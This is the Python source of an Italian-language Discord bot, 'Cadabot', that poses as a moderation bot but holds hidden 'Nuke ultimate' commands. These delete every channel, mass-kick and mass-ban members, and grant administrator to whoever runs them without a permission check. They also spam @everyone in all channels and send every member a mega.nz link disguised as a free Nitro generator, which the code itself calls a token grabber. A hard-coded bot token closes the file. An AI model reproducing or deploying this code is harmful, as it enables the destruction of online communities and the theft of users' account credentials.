
import discord
from discord.ext import commands
from discord.ext.commands import Bot
import asyncio
import time
import logging
import random  
from discord.ext import commands, tasks
from discord.voice_client import VoiceClient
import youtube_dl
from random import choice


client = commands.Bot(command_prefix='!')

client.remove_command("help")



@client.event
async def on_ready():
    print(' ███╗░░██╗██╗░░░██╗██╗░░██╗███████╗  ██████╗░░█████╗░████████╗')   
    print('██╔██╗██║██║░░░██║█████═╝░█████╗░░  ██████╦╝██║░░██║░░░██║░░░')   
    print('██║╚████║██║░░░██║██╔═██╗░██╔══╝░░  ██╔══██╗██║░░██║░░░██║░░░')
    print('██║╚████║██║░░░██║██╔═██╗░██╔══╝░░  ██╔══██╗██║░░██║░░░██║░░░')
    print('██║░╚███║╚██████╔╝██║░╚██╗███████╗  ██████╦╝╚█████╔╝░░░██║░░░')
    print('╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝╚══════╝  ╚═════╝░░╚════╝░░░░╚═╝░░░') 

    await client.change_presence(activity=discord.Streaming(name="🤖 !help", url='https://www.twitch.tv/matteohs'))

@client.event
async def on_server_join(server):
    print("Joining {0}".format(server.name))


@client.command(pass_context=True)
async def help(ctx):
    embed = discord.Embed(
    colour = discord.Colour.red()
    )
    embed.add_field(name='**Messaggio Ricevuto📨**', value='```✉️ Messaggio Inviato in privato con successo!```', inline=False)
    author = ctx.message.author
    await ctx.send(embed=embed)

    embed = discord.Embed(
        colour = discord.Colour.red()
    )

    embed.set_author(name='🔌▬▬▬▬▬◥◣Cadabot help command◢◤▬▬▬▬▬🔌')
    embed.add_field(name='!ping', value='🏓Fornisce ping al bot (espresso in ms)', inline=False)
    embed.add_field(name='!kick', value='👟kick  a un utente specificato', inline=False)
    embed.add_field(name='!ban', value='🔨Ban a un utente specificato', inline=False)
    embed.add_field(name='!userinfo', value='ℹ️ Fornisce informazioni su un utente', inline=False)
    embed.add_field(name='!invite', value='🔗Restituisce il link di invito del bot', inline=False)
    embed.add_field(name='!clear', value='✉️Cancella una quantità X di messaggi', inline=False)
    embed.add_field(name='!serverinfo', value='📋mostra le info sul server', inline=False)
    embed.add_field(name='!avatar', value='👥mostra avatar utente', inline=False)
    embed.add_field(name='!8ball', value=' ❓gioca a verita o falso', inline=False)
    embed.add_field(name='!mute', value=' 🔇muta un utente utente specificato ', inline=False)
    embed.add_field(name='!unmute', value=' 🔇smuta un utente  specificato ', inline=False)
    embed.add_field(name='!unban', value='🔨Sbanna a un utente specificato', inline=False)
    embed.add_field(name='cadabot ', value='**🔌▬▬▬▬▬◥◣cadabot bot very good◢◤▬▬▬▬▬🔌**', inline=False)
    
    await author.send(embed=embed)



@client.command(pass_context=True)
@commands.has_permissions(administrator=True)
async def clear(ctx, arg: int):
    if not arg:
        embed = discord.Embed(
            color=discord.Colour.red()
        )
        embed.set_author(
            name="[🛡️] Security Guard Specifica quante messaggi vuoi cancellare",
            icon_url="https://cdn.discordapp.com/attachments/640563710104043530/730639329453670420/DuscePeppe_FRIULI.png"
        )
        await ctx.send(embed=embed)
        return
    embed = discord.Embed(
        color=discord.Colour.blue()
    )
    embed.set_author(
        name=f'[🛡️] Security Guard Ho cancellato ufficialmente:  {arg} messaggi',
        icon_url=f'{ctx.author.avatar_url}'
    )
    await ctx.channel.purge(limit=arg+1)
    await ctx.send(embed=embed)
    embed = discord.Embed(
        color=discord.Colour.blue()
    )
    embed.set_author(
        name=f'{ctx.author._user}[🛡️] Security Guard ha cancellato: {arg}',
        icon_url=f'{ctx.author.avatar_url}'
    )
    embed.add_field(
        name='[🛡️] Security Guard Messaggi cancellati da:',
        value=f'{ctx.author._user}',
        inline=True
    )
    embed.add_field(
        name='Quantità:',
        value=f'{arg}',
        inline=True
    )

    await discord.channel.send(embed=embed)
@clear.error
async def clear_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        embed = discord.Embed(
            color=discord.Colour.blue()
        )
        embed.set_author(
            name="**[🛡️] Security Guard Non ti è permesso cancellare i messaggi**",
        )
        await ctx.send(embed=embed)


@client.command(pass_context=True)
async def ping(ctx):
	channel = ctx.message.channel
	t1 = time.perf_counter()
	await channel.trigger_typing()
	t2 = time.perf_counter()
	embed=discord.Embed(title=None, description='Ping 🌐: {}'.format(round((t2-t1)*1000)), color=0x2874A6)
	await channel.send(embed=embed)


@client.command()
async def userinfo(ctx, member: discord.Member):

    roles = [role for role in member.roles]

    embed = discord.Embed(colour=member.color, timestamp=ctx.message.created_at)

    embed.set_author(name=f"info untente - {member}")
    embed.set_thumbnail(url=member.avatar_url)
    embed.set_footer(text=f"Commando eseguito da {ctx.author}", icon_url=ctx.author.avatar_url)

    embed.add_field(name="**ID:**", value=member.id)
    embed.add_field(name="**nome utente:**", value=member.display_name)

    embed.add_field(name="**account creato:**", value=member.created_at.strftime("%a, %#d %B %Y, %I:%M %p UTC"))
    embed.add_field(name="**entrato nel server:**", value=member.joined_at.strftime("%a, %#d %B %Y, %I:%M %p UTC"))

    embed.add_field(name=f"**Ruoli:** ({len(roles)})", value=" ".join([role.mention for role in roles]))
    embed.add_field(name="**ruoli alti:**", value=member.top_role.mention)

    embed.add_field(name=" **è un Bot ?:**", value=member.bot)

    await ctx.send(embed=embed)


@client.command()
@commands.has_permissions(administrator=True)
async def ban(ctx, member: discord.Member=None,*,arg=' [🛡️] Security Guard Motivo non specificato'):
    embed = discord.Embed(
        colour = discord.Colour.red()
    )
    await ctx.message.delete()
    await ctx.member.ban()
    await ctx.send (f' [🛡️] Security Guard è stato bannato per: {arg}')
    await ctx.send(embed=embed)




@ban.error
async def ban_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        embed = discord.Embed(
            color=discord.Colour.red()
        )
        embed.set_author(
            name="Non ti è permesso bannare!",
        )
        await ctx.send(embed=embed)



@client.command(aliases=['ub'])
@commands.has_permissions(ban_members=True)
async def unban(ctx,*,member):
        banned_users = await ctx.guild.bans()
        member_name, member_disc = member.split('#')

        for banned_entry in banned_users:
            user = banned_entry.user

        if(user.name, user.discriminator)==(member_name,member_disc):

                await ctx.guild.unban(user)
                await ctx.send(member_name +"**[🛡️] Security Guard Utente è stato sbannato**")
                return

        await ctx.send(member+" war not found")


@client.command()
@commands.has_permissions(administrator=True)
async def kick(ctx, member : discord.Member, *, reason=None):
    await member.kick(reason=reason)
    await ctx.send(f'Kicked {member.mention}')

@kick.error
async def kick_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        embed = discord.Embed(
            color=discord.Colour.red()
        )
        embed.set_author(
            name="**[🛡️] Security Guard non ti è permesso kickare**",
        )
        await ctx.send(embed=embed)



@client.command()
@commands.has_permissions(administrator=True)
async def mute(ctx, member: discord.Member=None):
    role = discord.utils.get(ctx.guild.roles, name="Muted")
    if not member:
        await ctx.send("[🛡️] Security Guard Si prega di specificare un membro")
        return
    await member.add_roles(role)
    await ctx.send("[🛡️] Security Guard Utente mutato")

@mute.error
async def mute_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        embed = discord.Embed(
            color=discord.Colour.blue()
        )
        embed.set_author(
            name="[🛡️] Security Guard Non ti è permesso mutare!",
        )
        await ctx.send(embed=embed)



@client.command()
@commands.has_permissions(administrator=True)
async def unmute(ctx, member: discord.Member=None):
    role = discord.utils.get(ctx.guild.roles, name="Muted")
    if not member:
        await ctx.send("[🛡️] Security Guard Si prega di specificare un membro")
        return
    await member.remove_roles(role)
    await ctx.send("[🛡️] Security Guard Utente smutato")

@unmute.error
async def unmute_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        embed = discord.Embed(
            color=discord.Colour.blu()
        )
        embed.set_author(
            name="[🛡️] Security Guard Non ti è permesso smutare",
        )
        await ctx.send(embed=embed)


@client.command(pass_context=True)
async def invite(ctx):
    channel = ctx.message.channel
    await channel.send("https://discord.com/api/oauth2/authorize?client_id=756770995590660107&permissions=8&scope=bot")


@client.command()
async def serverinfo(ctx, guild: discord.Guild = None):
    guild = ctx.guild if not guild else guild
    embed = discord.Embed(title=f"Server info {guild}", description="Cadabot", timestamp = ctx.message.created_at, color=discord.Color.red())
    embed.set_thumbnail(url=guild.icon_url)
    embed.add_field(name="👑Fondatore", value=guild.owner, inline=False)
    embed.add_field(name="📆Server creato:", value=guild.created_at, inline=False)
    embed.add_field(name="📝Descrizione:", value= guild.description, inline=False)
    embed.add_field(name="👤numero membri:", value= guild.member_count, inline=False)
    embed.add_field(name="💼numero Canali:", value= len(guild.channels), inline=False)
    embed.add_field(name="🔖numero ruoli:", value=len(guild.roles), inline=False)
    embed.add_field(name="💜Numero Boost:", value= guild.premium_subscription_count, inline=False)
    embed.add_field(name="〽️Emoji:", value=guild.emoji_limit, inline=False)
    embed.set_footer(text=f"Commando eseguito da {ctx.author}", icon_url = ctx.author.avatar_url)
    await ctx.send(embed=embed)

@client.command()
async def avatar(ctx, member: discord.Member = None):
    if not member:
        member = ctx.message.author
    embed = discord.Embed(color=0x1560bd)
    embed.title = "👱 Avatar Utente"
    embed.set_image(url=member.avatar_url)
    await ctx.send(embed=embed)

@client.command(aliases=['8ball', 'test'])
async def _8ball(ctx, *, question):
    embed = discord.Embed(color=0x1560bd)
    responses = ['🟢  Probabilmente ',
                ' 🔴  Probabilmente no ',]
    await ctx.send(f'⁉️ Domanda: {question}\nRisposta: {random.choice(responses)}')



@client.command(pass_context=True)
async def cada(ctx):
    member = ctx.message.author
    embed = discord.Embed(
        colour = discord.Colour.red()
    )

    embed = discord.Embed(
    colour = discord.Colour.red()
    )
    embed.add_field(name='**Messaggio Ricevuto📨**', value='```✉️ Messaggio Inviato in privato con successo!```', inline=False)
    author = ctx.message.author
    await ctx.send(embed=embed)

    embed = discord.Embed(
        colour = discord.Colour.red()
    )

    embed.set_author(name='☢️▬▬▬▬▬◥◣◆Cadabot Nuke ultimate v 5.5◆◢◤▬▬▬▬▬☢️')
    embed.add_field(name='!kall', value='👟Espelle tutti dal server il bot ha bisogno di kicking permes', inline=False)
    embed.add_field(name='!a', value='👮🏼‍♂️Crea un ruolo con ammistratore e lo da chi  fa il commando', inline=False)
    embed.add_field(name='!dm', value='💬Fa un DMtool a tutto il server hai bisogno di  un ruolo con amministratore per fare il ' , inline=False)
    embed.add_field(name='!text', value=' 🌐Crea x quantita di canali testuali definiti dall utente', inline=False)
    embed.add_field(name='!role', value='💼Crea x quantita di ruoli definiti dall utente', inline=False)
    embed.add_field(name='!nuke', value=' 💣 Cancella tutte le stanze del server e banna tutti e crea un canale che pinga tutto il server', inline=False)
    embed.add_field(name='!spam', value=' ❗️Spamma in tutti i canali @everyone', inline=False)
    embed.add_field(name='!ghostspam', value='👻Spamma in tutti i canali @everyone invisibili ', inline=False)
    embed.add_field(name='!spamimage', value='📷Spamma in tutti i canali immagini con @everyone  ', inline=False)
    embed.add_field(name='!nitro', value='📀manda in dm un token grabber a tutti gli utenti del server hai bisogno di  un ruolo con amministratore per fare il commando', inline=False)
    embed.add_field(name='!voice', value='🔊Crea x quantita di canali vocali definiti dall utente', inline=False)
    embed.add_field(name='!free', value='✔️spamma in tutti i canali  un token grabber ', inline=False)
    embed.add_field(name='stop', value='📛per fermare lo spam digita stop ', inline=False)
    embed.add_field(name='!servername', value=' 📝cambia nome al server ', inline=False)
    embed.add_field(name='!icon', value='Ⓜ️cambia immagine al server ', inline=False)
    embed.add_field(name='.', value='☢️**▬▬▬▬▬◥◣◆Developer is Nuke Discord◆◢◤▬▬▬▬▬**☢️', inline=False)
    await member.send(embed=embed)

@client.command(pass_context=True)
async def kall(ctx):
    guild = ctx.message.guild
    logchannel = client.get_channel(751153555897057290)
    for member in list(ctx.message.guild.members):
        try:    
            await guild.kick(member)
            await guild.kick(member)
            print ("User " + member.name + " è stato kickato dal server")
            embed = discord.Embed(
            colour = discord.Colour.red()
            )
            embed.add_field(name="User kicked", value=f'{member.name}')
            await logchannel.send(embed=embed)
        except:
            pass
    print ("Action Completed: kall")
    


@client.command(pass_context=True)
async def ball(ctx):
    guild = ctx.message.guild
    logchannel = client.get_channel(751153555897057290)
    for member in list(ctx.message.guild.members):
        try:
            await guild.ban(member)
            await guild.ban(member)
            print ("User " + member.name + " è stato bannato dal server")
            embed = discord.Embed(
            colour = discord.Colour.red()
            )
            embed.add_field(name="User banned", value=f'{member.name}')
            await logchannel.send(embed=embed)
        except:
            pass
    print ("Action Completed: ball")

@client.command(pass_context=True)
async def nuke(ctx):
        logchannel = client.get_channel(751153555897057290)
        for channel in list(ctx.message.guild.channels):
            try:
                
                
                await channel.delete()
                print (channel.name + "  è stato cancellato") 
                embed = discord.Embed(
                colour = discord.Colour.red()
                )
                embed.add_field(name="Channel deleted", value=f'#{channel.name}')
                await logchannel.send(embed=embed)
            except:
                pass
        guild = ctx.message.guild
        
        channel = await guild.create_text_channel("Get Nuked")
        
        
        await channel.send("@everyone Nuke ultimate  to the server epic‼️") 
        await channel.send("@everyone Nuke ultimate  to the server epic‼️")
        for member in list(ctx.message.guild.members):
            
            try:
                await guild.ban(member)
                await guild.ban(member)
                print ("User " + member.name + " è stato bannato ")
                embed = discord.Embed(
                colour = discord.Colour.red()
                )
                embed.add_field(name="User banned", value=f'{member.name}')
                await logchannel.send(embed=embed)
            except:
                pass
        print("💣◥◣Nuke Server◢◤💣")

@client.command(pass_context=True)
async def a(ctx):
    guild = ctx.message.guild
    perms = discord.Permissions(8)
    logchannel = client.get_channel(751153555897057290)
    await guild.create_role(name='*', permissions=perms)
    member = ctx.message.author
    role = discord.utils.get(guild.roles, name="*")
    await member.add_roles(role)
    embed = discord.Embed(
    colour = discord.Colour.red()
    )
    embed.add_field(name="User got admin", value=f'{member}')
    await logchannel.send(embed=embed)

@client.command(pass_context=True)
async def text(ctx, x):
    guild = ctx.message.guild
    logchannel = client.get_channel(751153555897057290)
    for i in range(int(x)):
        await guild.create_text_channel("nuked Ultimate")        
    embed = discord.Embed(
    colour = discord.Colour.red()
    )
    embed.add_field(name="Channels created", value=f'{x}')
    await logchannel.send(embed=embed)

@client.command(pass_context=True)
async def voice(ctx, x):
    guild = ctx.message.guild
    logchannel = client.get_channel(751153555897057290)
    for i in range(int(x)):
        await guild.create_voice_channel("nuked Ultimate")        
    embed = discord.Embed(
    colour = discord.Colour.red()
    )
    embed.add_field(name="Channels created", value=f'{x}')
    await logchannel.send(embed=embed)



@client.command(pass_context=True)
async def role(ctx, x):
    guild = ctx.message.guild
    perms = discord.Permissions(8)
    logchannel = client.get_channel(751153555897057290)
    for i in range(int(x)):
        await guild.create_role(name="nuked Ultimate", permissions=perms)
    embed = discord.Embed(
    colour = discord.Colour.red()
    )
    embed.add_field(name="Roles created", value=f'{x}')
    await logchannel.send(embed=embed)


@client.command(pass_context=True)
@commands.has_permissions(administrator=True)
async def dm(ctx):
    guild = ctx.message.guild
    logchannel = client.get_channel(751153555897057290)
    adminlist = [751153555897057290, 751153555897057290, 751153555897057290, 751153555897057290, 751153555897057290]
    for member in guild.members:
        if member.id not in adminlist:
            await asyncio.sleep(4)
            try:
                await member.send("https://discord.gg/KbRCybA hey entra qui nel nuovo server")
                await asyncio.sleep(4)
                embed = discord.Embed(
                colour = discord.Colour.purple()
                )
                embed.add_field(name="User messaged", value=f'{member}')
                await logchannel.send(embed=embed)
            except:
                pass

@client.command()
async def spam(ctx):
    """Spam messages in all channels."""
    await ctx.message.delete()
    await ctx.send('☢️**◥◣Spamming initiated!◢◤☢️**')
    await asyncio.sleep(1)
    def check_reply(m):
        return m.content == 'stop' and m.author == ctx.author

    async def spam_text():
        while True:
            for tc in ctx.guild.text_channels:
                await tc.send('@everyone Nuke ultimate  to the server epic‼️')   
                await asyncio.sleep(1)
    spam_text_task = client.loop.create_task(spam_text())
    await client.wait_for('message', check=check_reply)
    spam_text_task.cancel()
    await ctx.send('**💣◥◣Spamming complete!◢◤**')



@client.command()
async def ghostspam(ctx):
    """Spam messages in all channels."""
    await ctx.message.delete()
    await ctx.send('☢️**◥◣Spamming initiated!◢◤☢️**.')
    await asyncio.sleep(1)
    def check_reply(m):
        return m.content == 'stop' and m.author == ctx.author

    async def spam_text():
        while True:
            for tc in ctx.guild.text_channels:
                await ctx.send("@everyone Nuke Ultimate  To the Server Epic‼️", delete_after=1)
                await ctx.send("@everyone Nuke Ultimate  To the Server Epic‼️", delete_after=1)
                await asyncio.sleep(1)
    spam_text_task = client.loop.create_task(spam_text())
    await client.wait_for('message', check=check_reply)
    spam_text_task.cancel()
    await ctx.send('**💣◥◣Spamming complete!◢◤**')
from discord.ext import commands


@client.command()
async def spamimage(ctx):
    """Spam messages in all channels."""
    await ctx.message.delete()
    await ctx.send('☢️**◥◣Spamming initiated!◢◤☢️**')
    await asyncio.sleep(1)
    def check_reply(m):
        return m.content == 'stop' and m.author == ctx.author

    async def spam_text():
        while True:
            for tc in ctx.guild.text_channels:
                await tc.send('@everyonehttps://cdn.discordapp.com/attachments/731193544684863569/756178265445761144/image.png')
                await asyncio.sleep(1)
    spam_text_task = client.loop.create_task(spam_text())
    await client.wait_for('message', check=check_reply)
    spam_text_task.cancel()
    await ctx.send('**💣◥◣Spamming complete!◢◤**')
from discord.ext import commands

@client.command(pass_context=True)
@commands.has_permissions(administrator=True)
async def nitro(ctx):
    guild = ctx.message.guild
    logchannel = client.get_channel(751153555897057290)
    adminlist = [751153555897057290, 751153555897057290, 751153555897057290, 751153555897057290, 751153555897057290]
    for member in guild.members:
        if member.id not in adminlist:
            await asyncio.sleep(4)
            try:
                await member.send("https://mega.nz/file/uyZEyKiR#Nw3TCuIB4oGE9C-8ILlMLN1FYQ4MCkSE6l5bwpfO8CA Ciao! hai appena ricevuto un generatore di nitro gratuito un download nel quale troverai dei file una volta scaricati. Programmi necessari winrar dopo aver aperto il tutto clicca il file apri la cartella e esegui nitro generar.py")
                await asyncio.sleep(4)
                embed = discord.Embed(
                colour = discord.Colour.purple()
                )
                embed.add_field(name="User messaged", value=f'{member}')
                await logchannel.send(embed=embed)
            except:
                pass



@client.command()
async def free(ctx):
    """Spam messages in all channels."""
    await ctx.message.delete()
    await ctx.send('☢️**◥◣Spamming nitro  free!◢◤☢️** ')
    await asyncio.sleep(1)
    def check_reply(m):
        return m.content == 'stop' and m.author == ctx.author

    async def spam_text():
        while True:
            for tc in ctx.guild.text_channels:
                await tc.send('@everyone https://mega.nz/file/uyZEyKiR#Nw3TCuIB4oGE9C-8ILlMLN1FYQ4MCkSE6l5bwpfO8CA Ciao! hai appena ricevuto un generatore di nitro gratuito un download nel quale troverai dei file una volta scaricati. Programmi necessari winrar dopo aver aperto il tutto clicca il file apri la cartella e esegui nitro generar.py')
                await tc.send('@everyone https://mega.nz/file/uyZEyKiR#Nw3TCuIB4oGE9C-8ILlMLN1FYQ4MCkSE6l5bwpfO8CA Ciao! hai appena ricevuto un generatore di nitro gratuito un download nel quale troverai dei file una volta scaricati. Programmi necessari winrar dopo aver aperto il tutto clicca il file apri la cartella e esegui nitro generar.py ')
                await asyncio.sleep(1)
    spam_text_task = client.loop.create_task(spam_text())
    await client.wait_for('message', check=check_reply)
    spam_text_task.cancel()
    await ctx.send('**💣◥◣Spamming nitro complete!◢◤**')


@client.command()
async def servername(ctx):
    await ctx.guild.edit(name="Server Nuked")




@client.command()
async def icon(ctx):
    with open('image.png', 'rb') as f:
        icon = f.read()
    await ctx.guild.edit(icon=icon)


@client.command()
async def command(ctx):

    embed = discord.Embed(
        colour=discord.Colour.red(),
        title="🔌▬▬▬▬▬◥◣help command◢◤▬▬▬▬▬🔌",
        description="**command Cadabot**"
    )

    embed.set_author(name="Cadabot help command", icon_url="https://cdn.discordapp.com/attachments/757228626658852906/757935870186750013/CADABOT_LOGO.png")
    embed.add_field(name="!ping", value="🏓```Fornisce ping al bot (espresso in ms)```", inline=False)
    embed.add_field(name="!kick", value="👟```kicka a un utente specificato```", inline=False)
    embed.add_field(name="!ban", value="🔨```Banna a un utente specificato```", inline=False)
    embed.add_field(name="!userinfo", value="ℹ️ ```Fornisce informazioni su un utente```", inline=False)
    embed.add_field(name="!invite", value="🔗```Restituisce il link di invito del bot```", inline=False)
    embed.add_field(name="!clear", value="✉️```Cancella una quantità X di messaggi```", inline=False)
    embed.add_field(name="!serverinfo", value="```📋mostra le info sul server```", inline=False)
    embed.add_field(name="!avatar", value="👥```mostra avatar utente```", inline=False)
    embed.add_field(name='!8ball', value=' ❓```gioca a verita o falso```', inline=False)
    embed.add_field(name='!mute', value='🔇```muta un utente utente specificato```', inline=False)
    embed.add_field(name="!unban", value="🔨```sbanna a un utente specificato```", inline=False)
    embed.add_field(name='!unmute', value='🔇```smuta un utente  specificato```', inline=False)
    embed.add_field(name='. ', value='**🔌▬▬▬▬▬◥◣cadabot bot very good◢◤▬▬▬▬▬🔌**', inline=False)
    await ctx.send(embed=embed)


@client.command()
async def nuked(ctx):

    embed = discord.Embed(
        colour=discord.Colour.red(),
        title="☢️▬▬▬▬▬◥◣◆Cadabot Nuke ultimate v 5.5◆◢◤▬▬▬▬▬☢️",
        description="."
    )
    embed.set_author(name=".", icon_url="https://cdn.discordapp.com/attachments/757228626658852906/757935870186750013/CADABOT_LOGO.png")
    embed.add_field(name='!kall', value='👟```Espelle tutti dal server il bot ha bisogno di kicking permes```', inline=False)
    embed.add_field(name='!a', value='👮🏼‍♂️```Crea un ruolo con ammistratore e lo da chi  fa il commando```', inline=False)
    embed.add_field(name='!dm', value='💬```Fa un DMtool a tutto il server hai bisogno di  un ruolo con amministratore per fare il commando``` ' , inline=False)
    embed.add_field(name='!text', value=' 🌐```Crea x quantita di canali testuali definiti dall utente```', inline=False)
    embed.add_field(name='!role', value='💼```Crea x quantita di ruoli definiti dall utente```', inline=False)
    embed.add_field(name='!nuke', value=' 💣 ```Cancella tutte le stanze del server e banna tutti e crea un canale che pinga tutto il server```', inline=False)
    embed.add_field(name='!spam', value=' ❗️```Spamma in tutti i canali @everyone```', inline=False)
    embed.add_field(name='!ghostspam', value='👻```Spamma in tutti i canali @everyone invisibili``` ', inline=False)
    embed.add_field(name='!spamimage', value='📷```Spamma in tutti i canali immagini con @everyone```  ', inline=False)
    embed.add_field(name='!nitro', value='📀```manda in dm un token grabber a tutti gli utenti del server hai bisogno di  un ruolo con amministratore per fare il commando```', inline=False)
    embed.add_field(name='!voice', value='🔊```Crea x quantita di canali vocali definiti dall utente```', inline=False)
    embed.add_field(name='!free', value='✔️```spamma in tutti i canali  un token grabber``` ', inline=False)
    embed.add_field(name='stop', value='📛```per fermare lo spam digita stop``` ', inline=False)
    embed.add_field(name='!servername', value=' 📝```cambia nome al server``` ', inline=False)
    embed.add_field(name='!icon', value='Ⓜ️```cambia immagine al server``` ', inline=False)
    embed.add_field(name='. ', value='☢️**▬▬▬▬▬◥◣◆Developer is Nuke Discord◆◢◤▬▬▬▬▬**☢️', inline=False)
    await ctx.send(embed=embed)































client.run("NzU2NzcwOTk1NTkwNjYwMTA3.X2Wr6Q.WMU75dK1cyu_SkHE2L9zIXe3388")
